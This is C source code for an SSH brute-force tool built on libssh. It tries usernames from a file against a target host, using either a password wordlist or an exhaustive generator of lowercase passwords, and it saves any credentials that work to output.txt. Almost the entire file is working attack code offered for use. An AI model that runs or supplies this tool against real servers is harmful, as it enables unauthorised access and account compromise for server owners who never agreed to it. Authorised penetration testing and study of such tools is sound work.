/*
*   SSH Bruteforcer
*   Coded by: x899 (https://github.com/x899)
*
*   Usage: ./sshbrute -t target -uf ufile -pf pfile [-po 22 (default)] [-b]
*
*   Note:   1) If '-b' option is used, '-pf' option will be ignored.
*           2) '-uf' option is mandatory.
*           3) 22 is the default port, but can be changed using '-po' option.
*/

#include <libssh/libssh.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>


// characters that will be used in brute force password generation
// you can also append uppercase letter and numeric value

static const char alphabet[] =
"abcdefghijklmnopqrstuvwxyz";

static const int alphabetSize = sizeof(alphabet) - 1;


// get username from ufile [-uf option]

char *get_username(FILE *uf, char uline[])
{
    char ch;
    int i = 0;
    while ((ch = getc(uf)) != EOF) {
        if (ch == '\n') {
            uline[i] = '\0';
            i = 0;
            return uline;
        }
        if (ch != '\n') {
            uline[i] = ch;
            i = i + 1;
        }
    }
    return "None";
}

// get password from pfile [-pf option]

char *get_password(FILE *pf, char pline[])
{
    char ch;
    int i = 0;
    while ((ch = getc(pf)) != EOF) {
        if (ch == '\n') {
            pline[i] = '\0';
            i = 0;
            return pline;
        }
        if (ch != '\n') {
            pline[i] = ch;
            i = i + 1;
        }
    }
    return "None";
}


// brute force function

void brutepass (char* str, int index, int maxDepth, ssh_session my_ssh_session)
{
    int rc;
    for (int i = 0; i < alphabetSize; ++i)
    {
        //brute force string generator
        str[index] = alphabet[i];

        if (index == maxDepth - 1) {
            printf("[+] Password: %s -> ", str); 
            // checking for password authentication
            rc = ssh_userauth_password(my_ssh_session, NULL, str);
            if (rc == SSH_AUTH_SUCCESS) {
                // authentication successful
                printf("Connected\n");
                printf("\n\n[*] Password: %s\n", str);
                FILE *of;
                of = fopen("output.txt","w");
                fprintf(of, "\n[*] Password: %s\n", str);
                fclose(of);
                break;
            }
            else if (rc == SSH_AUTH_AGAIN) {
                // if there are too many authentication failure, exit the program 
                printf("\n");
                fprintf(stderr, "Error authenticating with password: %s\n", ssh_get_error(my_ssh_session));
                exit(-1);
            }
            else {
                printf("Incorrect Password\n");
            }
        }
        else brutepass(str, index + 1, maxDepth, my_ssh_session);
    }
}

int main(int argc, char *argv[])
{
    char *target, *username_file, *password_file;
    int c;
    int brute = 0;
    int port = 22;
    if (argc < 6) {
        printf("Usage: ./sshbrute -t target -uf ufile [-pf pfile] [-po 22 (default)] [-b]\n");
        exit(-1);
    }
    for (c = 1; c < argc; c++) {
        if (strcmp (argv[c], "-t") == 0) {
            c = c + 1;
            target = argv[c];
        }
        else if (strcmp (argv[c], "-uf") == 0) {
            c = c + 1;
            username_file = argv[c];
        }
        else if (strcmp (argv[c], "-pf") == 0) {
            c = c + 1;
            password_file = argv[c];
        }
        else if (strcmp (argv[c], "-po") == 0) {
            c = c + 1;
            port = atoi(argv[c]);
        }
        else if (strcmp (argv[c], "-b") == 0) {
            brute = 1;
        }
        else {
            printf("Usage: ./sshbrute -t target -uf ufile -pf pfile [-po 22 (default)] [-b]\n");
            exit(-1);
        }
    }

    FILE *uf;
    char uline[100];
    char *uname;
    uf = fopen(username_file, "r");
    int connected = 0;

    while ((uname = get_username(uf,uline)) != "None") {

        
        char pline[100];
        char *pname;

        ssh_session my_ssh_session;
        int rc;
        char *password;
        

        if (connected == 1)
            break;

        // creating ssh session
        my_ssh_session = ssh_new();
        if (my_ssh_session == NULL) {
            printf("session failed\n");
            exit(-1);
        }
        printf("\n[*] User: %s\n", uname);
        // setting up the ssh session with target ip, port and username
        ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, target);
        ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &port);
        ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, uname);

        // connecting to ssh server
        rc = ssh_connect(my_ssh_session);
        if (rc != SSH_OK) {
            fprintf(stderr, "Error connecting to localhost: %s\n", ssh_get_error(my_ssh_session));
            ssh_free(my_ssh_session);
            exit(-1);
        }

        // if brute force [-b] option is disabled, use password file
        if (brute == 0) {
            FILE *pf;
            pf = fopen(password_file, "r");
            while (connected == 0 && (pname = get_password(pf,pline)) != "None") {
                printf("[+] Password: %s -> ", pline);
                // checking for password authentication
                rc = ssh_userauth_password(my_ssh_session, NULL, pname);
                if (rc == SSH_AUTH_SUCCESS) {
                    // if password is correct, i.e. connection is established
                    // then write the username and password to output file
                    connected = 1;
                    printf("Connected\n");
                    printf("\n\n[*] Username: %s\n[*] Password: %s\n", uname, pname);
                    FILE *of; // writing output to file
                    of = fopen("output.txt","w");
                    fprintf(of, "\n\n[*] Username: %s\n[*] Password: %s\n", uname, pname);
                    fclose(of);
                    break;
                }
                else if (rc == SSH_AUTH_AGAIN) {
                    printf("\n");
                    // if there are too many authentication failure, exit the program 
                    fprintf(stderr, "Error authenticating with password: %s\n", ssh_get_error(my_ssh_session));
                    exit(-1);
                }
                else {
                    printf("Incorrect Password\n");
                }
            }
            fclose(pf); // closing the password file
        }
        else {
            int maxLen;
            // enter the lenght of password for brute force
            printf ("Enter the lenght of password: ");
            scanf ("%d", &maxLen);
            char* buf = malloc(maxLen + 1);
            memset (buf, 0, maxLen + 1);
            brutepass (buf, 0, maxLen, my_ssh_session);
            free (buf);
        }
        // disconnecting ssh session
        ssh_disconnect(my_ssh_session);
        ssh_free(my_ssh_session);
    }
    fclose(uf); // closing the username file
}